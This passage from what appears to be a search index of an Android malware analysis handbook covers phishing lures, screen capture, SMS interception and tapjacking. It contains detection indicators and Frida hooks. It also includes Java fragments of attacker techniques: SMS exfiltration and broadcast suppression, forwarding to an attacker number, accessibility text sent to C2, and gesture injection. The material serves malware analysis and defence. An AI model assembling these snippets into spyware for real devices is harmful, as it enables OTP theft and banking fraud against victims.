institutions.</p>"},{"location":"attacks/phishing-techniques/#voip-routed-vishing","title":"VoIP-Routed Vishing","text":"<p>LetsCAll malware routes all calls through attacker-controlled VoIP infrastructure. The victim believes they are speaking with their bank, but the call is handled by a human operator working for the attacker. This combines technical interception with live social engineering, making it harder to detect than pre-recorded approaches.</p>"},{"location":"attacks/phishing-techniques/#push-notification-phishing","title":"Push Notification Phishing","text":"<p>Malware with <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> can both read and generate push notifications. Attack pattern:</p> <ol> <li>Generate a fake push notification mimicking the victim's bank (\"Suspicious transaction detected -- verify now\")</li> <li>Notification tap opens a WebView credential harvesting page</li> <li>Simultaneously suppress real banking notifications to avoid contradicting the fake alert</li> </ol> <p>This is effective because users inherently trust push notifications from installed apps. TrickMo and GodFather both use this technique.</p>"},{"location":"attacks/phishing-techniques/#social-engineering-for-permission-grants","title":"Social Engineering for Permission Grants","text":"<p>Obtaining dangerous permissions (Accessibility, Device Admin, Notification Listener) requires convincing the victim to manually toggle settings. Common strategies:</p> Technique Implementation Target Permission Fake tutorial overlay Step-by-step instructions drawn over Settings app Accessibility \"Security update required\" Dialog claiming the OS needs an accessibility update Accessibility \"Battery optimization\" Claims the app needs accessibility for battery management Accessibility \"Enable notifications\" Tells user to enable notification access for \"full functionality\" Notification Listener \"Device protection\" Prompts user to activate device admin for \"anti-theft\" Device Admin \"Accessibility for disabled\" Poses as an assistive app that genuinely needs the permission Accessibility <p>Cerberus popularized the fake tutorial overlay -- it literally draws arrows and text boxes on top of the Settings screen, guiding the victim through each toggle. Most modern banking trojans have adopted variations of this technique.</p>"},{"location":"attacks/phishing-techniques/#lure-themes-by-region","title":"Lure Themes by Region","text":"Theme Regions Example Families Package delivery (\"Your parcel is held\") Europe, Japan, Australia FluBot, MoqHao Bank security alert Global GodFather, Cerberus, Anubis Tax refund / government notice US, UK, Germany, Japan Hydra variants Crypto airdrop / wallet verification Global SpyAgent, SparkCat Voicemail notification Europe, US FluBot Chrome / browser update Global Hook, Brokewell, Vultur Flash Player update Legacy (pre-2021) Anubis, Cerberus Video player / media codec LATAM, Southeast Asia Gigabud, GoldPickaxe Government ID / MyGov India, Thailand, Vietnam GoldPickaxe Subscription fraud lure Global (Play Store) Joker, Harly <p>Geographic targeting goes beyond translation. Regional campaigns match local carriers, banks, postal services, and government agencies. GodFather maintains localized phishing pages for banks across 16+ countries, dynamically selecting the inject based on device locale and installed banking apps.</p>"},{"location":"attacks/phishing-techniques/#families-by-primary-social-engineering-method","title":"Families by Primary Social Engineering Method","text":"Family Primary Vector Lure Scale FluBot SMS worm Package delivery / voicemail Millions of SMS/day at peak Fakecalls Fake APK site Banking app clone Targeted (Korea) Mamont SMS Delivery tracking Russia-focused GodFather Fake APK site + dropper Banking / crypto 400+ targets, 16+ countries Anatsa Play Store dropper PDF reader / cleaner 100K+ installs per dropper Hook Malvertising Chrome update 400+ targets Joker Play Store dropper Utility apps Thousands of dropper apps GriftHorse Play Store + messenger Prize / reward 10M+ victims MoqHao SMS Package delivery Japan, South Korea SpyNote Fake APK site Utility / banking Targeted campaigns"},{"location":"attacks/phishing-techniques/#common-phishing-flow","title":"Common Phishing Flow","text":"<p>Typical end-to-end attack chain:</p> <ol> <li>Delivery: victim receives smishing text (\"Your package could not be delivered\")</li> <li>Landing page: link leads to a fake carrier site with \"Download tracking app\" button</li> <li>APK install: victim enables <code>REQUEST_INSTALL_PACKAGES</code> for the browser and installs the APK</li> <li>Permission escalation: app shows fake tutorial to enable Accessibility</li> <li>Overlay injection: malware detects banking app launch, shows overlay to capture credentials</li> <li>2FA interception: accessibility or SMS permissions used to intercept OTP</li> <li>Account takeover: credentials + OTP sent to C2, attacker logs in from their device</li> </ol> <p>Each step relies on social engineering rather than technical exploitation. The weakest link is always the initial tap on a link in a text message.</p>"},{"location":"attacks/phishing-techniques/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Static indicators:</p> <ul> <li>HTML files mimicking banking login pages in assets or downloaded to internal storage</li> <li>Hardcoded SMS message templates with URL placeholders</li> <li><code>BroadcastReceiver</code> for <code>SMS_RECEIVED</code> or <code>WAP_PUSH_RECEIVED</code></li> <li><code>TelephonyManager</code> or <code>CallScreeningService</code> usage for call interception</li> <li>Localized string resources matching phishing lure themes</li> </ul> <p>Dynamic indicators:</p> <ul> <li>Outbound SMS to numbers not in contacts (worm propagation)</li> <li>WebView loading credential-harvesting URLs</li> <li>Fake notifications generated matching banking app package names</li> <li>Calls intercepted and rerouted through VoIP endpoints</li> </ul>"},{"location":"attacks/screen-capture/","title":"Screen Recording &amp; MediaProjection Abuse","text":"<p>Capturing the victim's screen in real time to steal credentials, monitor activity, or enable remote device control. Unlike overlay attacks that present fake UI, screen capture techniques passively observe the real UI -- the victim interacts with their actual banking app while the attacker watches or records every frame.</p>"},{"location":"attacks/screen-capture/#requirements","title":"Requirements","text":"Requirement Details Permission <code>FOREGROUND_SERVICE</code> + <code>FOREGROUND_SERVICE_MEDIA_PROJECTION</code> (Android 10+), or <code>BIND_ACCESSIBILITY_SERVICE</code> User Interaction MediaProjection consent dialog (one-time tap), or accessibility service enablement Infrastructure C2 server or WebSocket endpoint for live streaming"},{"location":"attacks/screen-capture/#techniques","title":"Techniques","text":""},{"location":"attacks/screen-capture/#mediaprojection-api","title":"MediaProjection API","text":"<p>The primary screen recording mechanism since Android 5.0. The <code>android.media.projection.MediaProjection</code> class creates a virtual display that mirrors the device screen. The attacker obtains a <code>MediaProjection</code> token through <code>MediaProjectionManager.createScreenCaptureIntent()</code>, which triggers a system consent dialog.</p> <pre><code>MediaProjectionManager projectionManager =\n    (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);\nIntent captureIntent = projectionManager.createScreenCaptureIntent();\nstartActivityForResult(captureIntent, REQUEST_CODE);\n</code></pre> <p>On receiving the result:</p> <pre><code>@Override\nprotected void onActivityResult(int requestCode, int resultCode, Intent data) {\n    MediaProjection projection = projectionManager.getMediaProjection(resultCode, data);\n    VirtualDisplay display = projection.createVirtualDisplay(\n        \"capture\",\n        screenWidth, screenHeight, screenDensity,\n        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,\n        surface, null, null\n    );\n}\n</code></pre> <p>The <code>Surface</code> target can be an <code>ImageReader</code> for screenshots, a <code>MediaRecorder</code> for video files, or a <code>MediaCodec</code> encoder feeding frames to a network socket for live streaming.</p> <p>Malware typically wraps this in a foreground service to maintain the projection while backgrounded. The encoded frames (H.264 or MJPEG) stream to C2 over WebSocket or a custom TCP protocol.</p>"},{"location":"attacks/screen-capture/#accessibility-based-screen-reading","title":"Accessibility-Based Screen Reading","text":"<p>An alternative that requires no MediaProjection consent. The accessibility service traverses the <code>AccessibilityNodeInfo</code> tree to extract all visible text from the current screen.</p> <pre><code>@Override\npublic void onAccessibilityEvent(AccessibilityEvent event) {\n    AccessibilityNodeInfo root = getRootInActiveWindow();\n    if (root == null) return;\n    extractNodes(root);\n}\n\nprivate void extractNodes(AccessibilityNodeInfo node) {\n    if (node.getText() != null) {\n        sendToC2(node.getClassName().toString(), node.getText().toString());\n    }\n    for (int i = 0; i &lt; node.getChildCount(); i++) {\n        AccessibilityNodeInfo child = node.getChild(i);\n        if (child != null) {\n            extractNodes(child);\n            child.recycle();\n        }\n    }\n    node.recycle();\n}\n</code></pre> <p>This captures text content but not visual layout, images, or rendered WebView content. For banking trojans targeting specific fields, it is often sufficient -- account balances, transaction details, and form field values are all accessible as text nodes.</p>"},{"location":"attacks/screen-capture/#vnc-remote-access","title":"VNC / Remote Access","text":"<p>Several banking trojan families implement full VNC-like remote access by combining screen capture with input injection. The attacker views the victim's screen in real time and sends touch/gesture commands back to the device.</p> Component Implementation Screen capture MediaProjection frames encoded as H.264/VP8 Input injection Accessibility <code>dispatchGesture()</code> or <code>performAction()</code> Protocol Custom binary over WebSocket, or adapted VNC RFB protocol Latency Typically 200-500ms round trip <p>This gives the attacker full interactive control of the device, enabling manual fraud operations where the attacker logs into the banking app, navigates menus, and initiates transfers while watching the screen.</p>"},{"location":"attacks/screen-capture/#screen-streaming-to-c2","title":"Screen Streaming to C2","text":"<p>The real-time streaming pipeline used by most families:</p> <ol> <li>MediaProjection or <code>ImageReader</code> captures frames</li> <li>Frames encoded via <code>MediaCodec</code> (hardware H.264) or downscaled to JPEG</li> <li>Encoded data pushed over WebSocket or raw TCP to C2</li> <li>C2 panel renders the stream, optionally with touch input relay</li> </ol> <p>Frame rate is typically throttled to 1-5 FPS to reduce bandwidth. Some families (Octo, Vultur) use adaptive quality -- higher FPS during active interaction, dropping to periodic screenshots when the screen is idle.</p>"},{"location":"attacks/screen-capture/#flag_secure-bypass-attempts","title":"FLAG_SECURE Bypass Attempts","text":"<p>Apps can set <code>FLAG_SECURE</code> on their windows to prevent screenshots and screen recording. When active, MediaProjection captures black frames for that window.</p> Bypass Method How It Works Effectiveness Accessibility tree reading Ignores FLAG_SECURE entirely since it reads node text, not pixels Full bypass for text content Root + framebuffer access Reads <code>/dev/graphics/fb0</code> directly Requires root, works on older kernels Root + SurfaceFlinger <code>screencap</code> via <code>adb shell</code> with elevated privileges Requires root Xposed/LSPosed hooks Hook <code>Window.setFlags()</code> to strip FLAG_SECURE Requires Xposed framework Virtual display tricks Some older Android versions didn't enforce FLAG_SECURE on virtual displays Patched in Android 12+ <p>Most malware relies on accessibility tree reading as the FLAG_SECURE bypass since it requires no root and works across all Android versions. The pixel-level bypasses are limited to rooted devices or exploit chains.</p>"},{"location":"attacks/screen-capture/#android-version-evolution","title":"Android Version Evolution","text":"Version Change Impact on Malware Android 5.0 MediaProjection API introduced Screen recording possible without root Android 5.0-9 Consent dialog, no ongoing indicator Malware shows dialog once, records indefinitely Android 10 <code>FOREGROUND_SERVICE_MEDIA_PROJECTION</code> type required Must declare foreground service type in manifest Android 10 Persistent notification required for media projection User sees ongoing notification (malware disguises it) Android 11 MediaProjection token no longer reusable across app restarts Must re-trigger consent after process death Android 12 StatusBar indicator for active screen sharing User may notice colored dot indicator Android 14 Consent dialog shown before each capture session Breaks single-consent-then-record-forever pattern Android 14 <code>onCapturedContentVisibilityChanged()</code> callback Apps can detect when they are being captured Android 15 Screenshot detection API (<code>Activity.ScreenCaptureCallback</code>) Target apps can respond to capture events <p>The trend is clear: each version makes MediaProjection harder to abuse silently. This pushes malware toward accessibility-based screen reading, which remains unaffected by these mitigations.</p>"},{"location":"attacks/screen-capture/#families-using-this-technique","title":"Families Using This Technique","text":"Family Method Details Hook VNC via accessibility Full remote access with touch relay, streams accessibility tree state to attacker panel Octo MediaProjection + accessibility Live screen streaming at adaptive FPS, combined with accessibility for input injection BRATA MediaProjection recording Records screen to local storage, exfiltrates video files to C2 SpyNote MediaProjection live stream Real-time screen sharing with bidirectional control, RAT-style remote access Vultur MediaProjection via AlphaVNC/ngrok Screen recording streamed through ngrok tunnels, later versions switched to custom protocol TrickMo Accessibility screen capture Captures screen content via accessibility tree traversal, targets banking app fields Medusa MediaProjection + VNC Live streaming with remote control capabilities BingoMod VNC via MediaProjection Screen-based VNC for on-device fraud Brokewell MediaProjection streaming Real-time screen mirroring to attacker Gigabud MediaProjection Screen recording triggered via accessibility, avoids overlay attacks entirely"},{"location":"attacks/screen-capture/#detection-during-analysis","title":"Detection During Analysis","text":""},{"location":"attacks/screen-capture/#static-indicators","title":"Static Indicators","text":"<ul> <li><code>FOREGROUND_SERVICE_MEDIA_PROJECTION</code> in <code>AndroidManifest.xml</code></li> <li><code>MediaProjectionManager</code> or <code>createScreenCaptureIntent</code> in decompiled code</li> <li><code>VirtualDisplay</code>, <code>ImageReader</code>, or <code>MediaCodec</code> usage</li> <li><code>AccessibilityNodeInfo</code> tree traversal with data exfiltration</li> <li>WebSocket or raw socket connections combined with media encoding classes</li> </ul>"},{"location":"attacks/screen-capture/#frida-detection-scripts","title":"Frida Detection Scripts","text":"<p>Hook MediaProjection creation to detect when malware initiates screen capture:</p> <pre><code>Java.perform(function() {\n    var MediaProjectionManager = Java.use(\"android.media.projection.MediaProjectionManager\");\n    MediaProjectionManager.createScreenCaptureIntent.implementation = function() {\n        console.log(\"[*] MediaProjection capture intent created\");\n        console.log(Java.use(\"android.util.Log\").getStackTraceString(\n            Java.use(\"java.lang.Exception\").$new()\n        ));\n        return this.createScreenCaptureIntent();\n    };\n\n    var MediaProjection = Java.use(\"android.media.projection.MediaProjection\");\n    MediaProjection.createVirtualDisplay.overload(\n        \"java.lang.String\", \"int\", \"int\", \"int\", \"int\",\n        \"android.view.Surface\", \"android.hardware.display.VirtualDisplay$Callback\",\n        \"android.os.Handler\"\n    ).implementation = function(name, w, h, dpi, flags, surface, cb, handler) {\n        console.log(\"[*] VirtualDisplay created: \" + name + \" (\" + w + \"x\" + h + \")\");\n        return this.createVirtualDisplay(name, w, h, dpi, flags, surface, cb, handler);\n    };\n});\n</code></pre> <p>Monitor accessibility tree traversal for bulk data extraction:</p> <pre><code>Java.perform(function() {\n    var AccessibilityNodeInfo = Java.use(\"android.view.accessibility.AccessibilityNodeInfo\");\n    AccessibilityNodeInfo.getText.implementation = function() {\n        var text = this.getText();\n        if (text != null) {\n            console.log(\"[*] AccessibilityNodeInfo.getText(): \" + text.toString());\n        }\n        return text;\n    };\n});\n</code></pre>"},{"location":"attacks/screen-capture/#dynamic-indicators","title":"Dynamic Indicators","text":"<ul> <li>Foreground service notification appearing after accessibility enablement</li> <li>High CPU usage from <code>MediaCodec</code> encoding</li> <li>Sustained outbound data stream (WebSocket or TCP) with consistent bandwidth</li> <li><code>VirtualDisplay</code> instance visible in <code>dumpsys display</code></li> <li>Accessibility service with <code>flagRetrieveInteractiveWindows</code> and <code>flagRequestFilterKeyEvents</code></li> </ul>"},{"location":"attacks/screen-capture/#relationship-to-other-techniques","title":"Relationship to Other Techniques","text":"<p>Screen capture is often combined with other attack techniques:</p> <ul> <li>Accessibility abuse provides the input injection needed for full remote access</li> <li>Overlay attacks are sometimes replaced entirely by screen capture (the attacker watches the victim use the real app)</li> <li>Keylogging captures the same credential data through input events rather than visual observation</li> </ul>"},{"location":"attacks/sms-interception/","title":"SMS Interception &amp; Theft","text":"<p>Intercepting, reading, sending, and forwarding SMS messages for OTP theft, premium fraud, worm propagation, and command-and-control. SMS interception was the original 2FA bypass technique in Android banking malware and remains relevant despite Android's progressive restrictions, because many financial institutions still rely on SMS-based authentication.</p>"},{"location":"attacks/sms-interception/#requirements","title":"Requirements","text":"Requirement Details Permission <code>RECEIVE_SMS</code>, <code>READ_SMS</code>, <code>SEND_SMS</code> -- varies by technique Play Store Restricted since January 2019. Only default SMS apps and approved use cases. Distribution Most SMS-abusing malware distributes via sideloading, smishing links, or third-party stores"},{"location":"attacks/sms-interception/#attack-techniques","title":"Attack Techniques","text":""},{"location":"attacks/sms-interception/#broadcast-interception","title":"Broadcast Interception","text":"<p>The <code>SMS_RECEIVED</code> broadcast is ordered, meaning receivers execute by priority. Malware registers a high-priority receiver to process the SMS before any other app:</p> <pre><code>&lt;receiver android:name=\".SmsReceiver\" android:exported=\"true\"&gt;\n    &lt;intent-filter android:priority=\"999\"&gt;\n        &lt;action android:name=\"android.provider.Telephony.SMS_RECEIVED\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <pre><code>public class SmsReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent);\n        for (SmsMessage msg : msgs) {\n            String sender = msg.getOriginatingAddress();\n            String body = msg.getMessageBody();\n            exfiltrate(sender, body);\n        }\n        abortBroadcast();\n    }\n}\n</code></pre> <p><code>abortBroadcast()</code> prevents the default SMS app from receiving the message -- the user never sees it. On Android 4.4+, only the default SMS app can successfully abort the broadcast, but the malware still receives and reads the content.</p>"},{"location":"attacks/sms-interception/#contentresolver-sms-query","title":"ContentResolver SMS Query","text":"<p>Reading stored SMS messages from the system content provider. Does not require real-time interception -- the malware queries the SMS database retroactively:</p> <pre><code>Cursor cursor = getContentResolver().query(\n    Uri.parse(\"content://sms/inbox\"),\n    new String[]{\"address\", \"body\", \"date\"},\n    null, null, \"date DESC\"\n);\nwhile (cursor.moveToNext()) {\n    String sender = cursor.getString(0);\n    String body = cursor.getString(1);\n    long date = cursor.getLong(2);\n    exfiltrate(sender, body, date);\n}\ncursor.close();\n</code></pre> <p>This provides access to the entire SMS history. Malware uses it to harvest OTP codes that arrived before the malware was installed, or to bulk-exfiltrate all messages for intelligence collection.</p>"},{"location":"attacks/sms-interception/#default-sms-app-technique","title":"Default SMS App Technique","text":"<p>Becoming the default SMS handler gives full control over SMS: reading, writing, sending, and deleting. The malware requests the <code>RoleManager.ROLE_SMS</code> role (Android 10+) or <code>Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT</code>:</p> <pre><code>RoleManager rm = getSystemService(RoleManager.class);\nif (!rm.isRoleHeld(RoleManager.ROLE_SMS)) {\n    startActivityForResult(rm.createRequestRoleIntent(RoleManager.ROLE_SMS), REQ_CODE);\n}\n</code></pre> <p>As default SMS app, the malware can:</p> <ul> <li>Intercept all incoming SMS silently</li> <li>Delete messages before the user reads them</li> <li>Send SMS on the user's behalf</li> <li>Access the full SMS database</li> </ul> <p>Social engineering drives this: the malware presents itself as an SMS management app and asks the user to set it as default during onboarding.</p>"},{"location":"attacks/sms-interception/#smsretriever-api-abuse","title":"SmsRetriever API Abuse","text":"<p>Google's <code>SmsRetriever</code> API lets apps receive specific SMS messages without <code>READ_SMS</code> or <code>RECEIVE_SMS</code> permissions. It works by matching an app-specific hash in the SMS body. Malware abuses this when:</p> <ul> <li>The attacker controls the SMS being sent (phishing scenarios)</li> <li>The attacker can predict or compute the target app's hash</li> <li>The malware poses as a legitimate app expecting verification SMS</li> </ul> <p>The API is designed for one-time verification and auto-fills the code. Malware intercepts the <code>SmsRetriever</code> result to steal the code.</p>"},{"location":"attacks/sms-interception/#sms-forwarding","title":"SMS Forwarding","text":"<p>After intercepting an SMS, the malware forwards it to an attacker-controlled number:</p> <pre><code>SmsManager sm = SmsManager.getDefault();\nsm.sendTextMessage(\"+1234567890\", null, stolenBody, null, null);\n</code></pre> <p>Some families forward every incoming SMS; others filter by sender (banking shortcodes) or content (messages containing digits matching OTP patterns). Forwarding creates a persistent exfiltration channel that works even if the C2 server is down.</p>"},{"location":"attacks/sms-interception/#premium-sms-fraud","title":"Premium SMS Fraud","text":"<p>Sending SMS to premium-rate numbers that charge the victim's phone bill. The malware sends to short codes controlled by the attacker (or an affiliate network), generating revenue per message:</p> <ol> <li>Malware sends SMS to premium short code</li> <li>Service replies with confirmation SMS</li> <li>Malware intercepts the confirmation and replies to complete the subscription</li> <li>Victim is charged recurring fees on their phone bill</li> </ol> <p>This was the dominant monetization strategy before banking trojans emerged. Joker alone was found in hundreds of Play Store apps running premium SMS fraud.</p>"},{"location":"attacks/sms-interception/#ussd-code-execution","title":"USSD Code Execution","text":"<p>Using <code>CALL_PHONE</code> permission to dial USSD codes that check balances, initiate transfers, or change account settings:</p> <pre><code>Intent ussd = new Intent(Intent.ACTION_CALL);\nussd.setData(Uri.parse(\"tel:\" + Uri.encode(\"*123#\")));\nstartActivity(ussd);\n</code></pre> <p>USSD codes vary by carrier and country. Malware targeting specific regions hardcodes USSD strings for local carriers to check prepaid balances, transfer airtime, or subscribe to services.</p>"},{"location":"attacks/sms-interception/#sms-as-c2-channel","title":"SMS as C2 Channel","text":"<p>Some families receive commands via SMS as a fallback when HTTP/HTTPS C2 is unreachable:</p> Aspect SMS C2 HTTP C2 Availability Works without internet Requires connectivity Takedown resistance No domain or IP to sinkhole Domains can be seized Visibility Carrier logs, lawful intercept Network monitoring, TLS inspection Bandwidth Very low, 160 chars per message Unlimited Cost Sender pays per message Free after infrastructure setup <p>Commands arrive as specially formatted SMS. The malware parses the body, executes the instruction, and optionally replies via SMS. State-sponsored tools like FinSpy and early Pegasus variants used SMS C2 because the operators had carrier-level access, eliminating the visibility risk.</p>"},{"location":"attacks/sms-interception/#evolution-of-sms-based-attacks","title":"Evolution of SMS-Based Attacks","text":"Era Technique Status 2012-2014 Premium SMS fraud (send to short codes) Still works, heavily monitored 2014-2017 <code>SMS_RECEIVED</code> broadcast with <code>abortBroadcast()</code> Broken on Android 4.4+ for non-default apps 2017-2019 Full SMS permissions for OTP theft Play Store ban in 2019 2019-2021 Default SMS app social engineering Requires user interaction 2020+ Notification listener replaces SMS interception Current primary method 2021+ Accessibility-based SMS reading Current fallback method 2022+ SmsRetriever API for targeted code theft Niche use cases <p>The trend is clear: each Android restriction pushed malware toward alternative channels. Modern families combine multiple approaches -- notification listener as primary, accessibility as fallback, and SMS permissions only when available.</p>"},{"location":"attacks/sms-interception/#android-version-restrictions","title":"Android Version Restrictions","text":"<p>Android 4.4 (API 19): only the default SMS app can call <code>abortBroadcast()</code> on <code>SMS_RECEIVED</code>. Other apps still receive the broadcast but cannot suppress it.</p> <p>Android 5.0 (API 21): <code>SMS_DELIVER</code> broadcast introduced, sent only to the default SMS app. <code>SMS_RECEIVED</code> still goes to all receivers but cannot be aborted.</p> <p>Android 6.0 (API 23): SMS permissions become runtime permissions. User must explicitly grant at runtime.</p> <p>Android 8.0 (API 26): implicit broadcast restrictions. <code>SMS_RECEIVED</code> is exempt (still delivered to manifest-registered receivers), but other SMS-related broadcasts follow the new restrictions.</p> <p>Android 10 (API 29): <code>READ_SMS</code> restricted. Only the default SMS app or apps with an active accessibility service can read the SMS content provider. <code>ROLE_SMS</code> replaces <code>ACTION_CHANGE_DEFAULT</code>.</p> <p>Android 13 (API 33): restricted settings prevent sideloaded apps from being set as default SMS app through normal Settings flows.</p>"},{"location":"attacks/sms-interception/#families-using-this-technique","title":"Families Using This Technique","text":"Family SMS Techniques Primary Purpose FluBot <code>SEND_SMS</code> to spread phishing links to all contacts, <code>RECEIVE_SMS</code> for OTP SMS worm propagation Anubis <code>RECEIVE_SMS</code> interception, SMS forwarding to C2 OTP theft for banking fraud SpyNote Full SMS read/receive/send for comprehensive surveillance RAT, SMS exfiltration Hydra SMS forwarding to attacker-controlled numbers, OTP interception Banking fraud Medusa SMS commands as C2 channel, OTP interception (v1) Banking fraud, remote control BRATA SMS reading for transaction confirmation codes, factory reset after theft Banking fraud Joker <code>SEND_SMS</code> to premium numbers, <code>RECEIVE_SMS</code> for confirmation interception Premium SMS subscription fraud Cerberus SMS interception with C2 forwarding, SMS-based 2FA bypass Banking credential theft GodFather SMS interception alongside notification monitoring Banking fraud Ermac SMS-based 2FA interception Banking fraud Hook SMS interception during ATS operations Banking ATS Octo SMS interception during remote access sessions Banking fraud Xenomorph SMS OTP capture feeding into ATS engine Banking ATS Anatsa OTP theft during automated bank transfers Banking ATS SharkBot SMS interception for ATS OTP bypass Banking ATS Vultur SMS interception alongside screen recording Banking fraud Chameleon SMS interception after disabling biometric prompts Banking fraud Mamont SMS interception combined with notification listening Russian banking fraud TsarBot SMS OTP capture across 750+ target apps Banking ATS Antidot SMS-based 2FA interception Banking fraud Crocodilus OTP theft during device takeover operations Banking DTO MoqHao SMS phishing distribution, SMS interception Smishing worm Rafel RAT SMS interception, ransomware unlock via SMS RAT, ransomware TrickMo SMS OTP theft, originally TrickBot's Android companion Banking fraud <p>FluBot stands out as a true SMS worm: it reads the victim's contact list and sends phishing SMS to every entry, each containing a link to download FluBot. At peak spread in 2021, it infected devices across Europe in chain-reaction fashion.</p>"},{"location":"attacks/sms-interception/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Static indicators:</p> <ul> <li><code>BroadcastReceiver</code> with <code>SMS_RECEIVED</code> intent filter, especially with high <code>android:priority</code></li> <li><code>RECEIVE_SMS</code>, <code>READ_SMS</code>, <code>SEND_SMS</code> permissions in manifest</li> <li>References to <code>content://sms</code> content provider URI</li> <li><code>SmsManager.sendTextMessage()</code> or <code>sendMultipartTextMessage()</code> calls</li> <li><code>Telephony.Sms.Intents.getMessagesFromIntent()</code> usage</li> <li><code>RoleManager.ROLE_SMS</code> or <code>ACTION_CHANGE_DEFAULT</code> intent</li> <li><code>abortBroadcast()</code> calls inside SMS receivers</li> </ul> <p>Dynamic indicators:</p> <ul> <li>SMS messages sent to unknown numbers shortly after installation</li> <li>Outbound SMS to premium short codes</li> <li>ContentResolver queries against <code>content://sms</code> returning bulk data</li> <li>Network traffic containing SMS content or OTP codes</li> <li>USSD dial attempts via <code>ACTION_CALL</code> intents</li> </ul>"},{"location":"attacks/sms-interception/#see-also","title":"See Also","text":"<ul> <li>SMS Permissions</li> <li>Notification Listener Abuse -- the modern replacement for SMS interception</li> <li>Broadcast Theft -- broader broadcast interception techniques</li> </ul>"},{"location":"attacks/tapjacking/","title":"Tapjacking","text":"<p>Tricking the user into tapping on something they didn't intend to by placing a transparent or partially obscuring overlay over a sensitive UI element. A specific application of overlay attacks focused on manipulating touch events rather than phishing credentials.</p>"},{"location":"attacks/tapjacking/#requirements","title":"Requirements","text":"Requirement Details Permission <code>SYSTEM_ALERT_WINDOW</code> Condition Target app does not filter obscured touches"},{"location":"attacks/tapjacking/#how-it-works","title":"How It Works","text":"<ol> <li>Malware draws a transparent or partially transparent overlay over the target UI</li> <li>The overlay shows a benign message (\"Tap to continue\", a game, a fake dialog)</li> <li>When the user taps, the touch passes through to the UI element underneath</li> <li>The underlying element could be a permission grant button, an install confirmation, or a settings toggle</li> </ol> <p>The key is <code>FLAG_NOT_TOUCHABLE</code> on the overlay window: when set, touches pass through the overlay to whatever is beneath it. The user sees the overlay content but their tap hits the hidden target.</p>"},{"location":"attacks/tapjacking/#classic-scenario","title":"Classic Scenario","text":"<p>Malware wants the user to click \"Allow\" on a permission dialog:</p> <ol> <li>Permission dialog appears behind the overlay</li> <li>Overlay shows an innocuous UI with a button positioned exactly over \"Allow\"</li> <li>User taps the overlay button</li> <li>Touch passes through to \"Allow\"</li> <li>Permission granted without user awareness</li> </ol>"},{"location":"attacks/tapjacking/#variants","title":"Variants","text":""},{"location":"attacks/tapjacking/#full-overlay-passthrough","title":"Full Overlay Passthrough","text":"<p>Entire screen covered with <code>FLAG_NOT_TOUCHABLE</code>. User sees the overlay but all touches go to the app behind it. Used to hide what the user is actually interacting with.</p>"},{"location":"attacks/tapjacking/#partial-overlay","title":"Partial Overlay","text":"<p>Only part of the screen is covered. The unobscured area contains the target (e.g., the \"Install\" button), while the overlay hides surrounding context that would alert the user.</p>"},{"location":"attacks/tapjacking/#timing-based","title":"Timing-Based","text":"<p>The overlay appears and disappears rapidly, showing for just long enough to catch a tap the user was already making. Harder to detect but less reliable.</p>"},{"location":"attacks/tapjacking/#android-mitigations","title":"Android Mitigations","text":"Version Mitigation Android 4.0.3 <code>filterTouchesWhenObscured</code> attribute added. Activities can reject touches when an overlay is present. Android 6.0 <code>SYSTEM_ALERT_WINDOW</code> moved to special permission (Settings toggle required). Android 8.0 <code>TYPE_APPLICATION_OVERLAY</code> renders below system dialogs (permission prompts, install confirmations). Android 12 System dialogs set <code>FLAG_WINDOW_IS_PARTIALLY_OBSCURED</code>. Overlays become untouchable over sensitive system UI."},{"location":"attacks/tapjacking/#remaining-gaps","title":"Remaining Gaps","text":"<ul> <li><code>filterTouchesWhenObscured</code> is opt-in. Apps must set it explicitly. Many don't.</li> <li>Third-party app UIs (not system dialogs) are still vulnerable.</li> <li>Accessibility service gestures bypass all overlay-based mitigations entirely.</li> </ul>"},{"location":"attacks/tapjacking/#detection-during-analysis","title":"Detection During Analysis","text":"<p>In code:</p> <pre><code>WindowManager.LayoutParams params = new WindowManager.LayoutParams(\n    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,\n    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,\n    PixelFormat.TRANSLUCENT\n);\n</code></pre> <p><code>FLAG_NOT_TOUCHABLE</code> combined with a translucent or transparent overlay is the indicator. The overlay's dimensions and position relative to known dialog button locations are relevant for determining intent.</p>"},{"location":"attacks/tapjacking/#families-using-this-technique","title":"Families Using This Technique","text":"<p>Modern banking trojans have largely moved past tapjacking toward accessibility abuse, which provides more reliable and comprehensive device control. Tapjacking was primarily seen in earlier malware generations (2014-2017) before accessibility service abuse became the standard approach. Current families that use overlays focus on credential phishing via overlay attacks rather than touch manipulation.</p> <p>However, tapjacking still appears in specific contexts:</p> Family Usage Anatsa Overlay to trick user into enabling accessibility service by placing transparent \"Allow\" button over permission dialog MoqHao Overlay to trick user into granting default SMS app permission Chameleon Overlay guiding user to disable biometric authentication in favor of PIN entry GoldPickaxe Overlay prompting facial biometric capture disguised as verification step TrickMo Overlay to capture the device screen lock PIN, displayed when the user attempts to unlock their phone or open a targeted app SpyNote Overlay that guides the user step-by-step through enabling accessibility service, showing arrows and instructions over the real Settings UI <p>The primary modern use is not stealing tap events (the classic tapjacking definition) but rather using transparent or misleading overlays to guide users through permission-granting flows. This is a social engineering application of the same overlay mechanism.</p>"},{"location":"attacks/tapjacking/#accessibility-gesture-alternative","title":"Accessibility Gesture Alternative","text":"<p>The accessibility service API provides <code>dispatchGesture()</code>, which programmatically injects touch events into any app on screen. This eliminates the need for tapjacking entirely -- no overlay required, no user interaction needed.</p> <pre><code>GestureDescription.Builder builder = new GestureDescription.Builder();\nPath clickPath = new Path();\nclickPath.moveTo(targetX, targetY);\nbuilder.addStroke(new GestureDescription.StrokeDescription(clickPath, 0, 50));\ndispatchGesture(builder.build(), null, null);\n</code></pre> <p>With accessibility service access, the malware can:</p> <ul> <li>Click any button on any screen, including permission grant dialogs</li> <li>Perform swipe gestures to navigate through settings menus</li> <li>Type text into input fields using <code>Bundle</code> arguments with <code>ACTION_SET_TEXT</code></li> 